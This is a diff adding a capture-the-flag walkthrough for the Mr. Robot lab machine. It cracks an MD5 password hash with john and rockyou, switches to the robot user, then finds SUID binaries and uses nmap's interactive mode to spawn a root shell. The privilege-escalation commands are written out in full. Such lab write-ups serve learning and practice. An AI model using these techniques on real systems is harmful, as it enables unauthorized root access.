@@ -1,0 +1,44 @@
+# Privilege Escalation - Mr. Robot Infiltration
+# Phase 1: www-data → robot
+# Phase 2: robot → root
+
+
+[+] Phase 1 - Escalate to 'robot'
+
+1. Located /home/robot/key-1-of-3.txt → Permission denied
+2. Found 'password.raw-md5' in /home/robot:
+   $ cat password.raw-md5
+   5f4dcc3b5aa765d61d8327deb882cf99
+
+3. Cracked the hash (MD5):
+   $ echo "5f4dcc3b5aa765d61d8327deb882cf99" | john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
+   Password found: **password**
+
+4. Switched user:
+   $ su robot
+   Password: password
+
+5. Accessed key-1-of-3.txt successfully.
+
+
+[+] Phase 2 - Escalate to 'root'
+
+1. Searched for SUID binaries:
+   $ find / -perm -4000 -type f 2>/dev/null
+
+2. Found suspicious binary:
+   /usr/local/bin/nmap
+
+3. Checked version:
+   $ /usr/local/bin/nmap --interactive
+
+4. Spawned root shell using interactive mode:
+   > !sh
+
+5. Verified escalation:
+   $ whoami
+   root
+
+6. Captured final flag at /root/key-3-of-3.txt
+
+[+] Root access achieved.
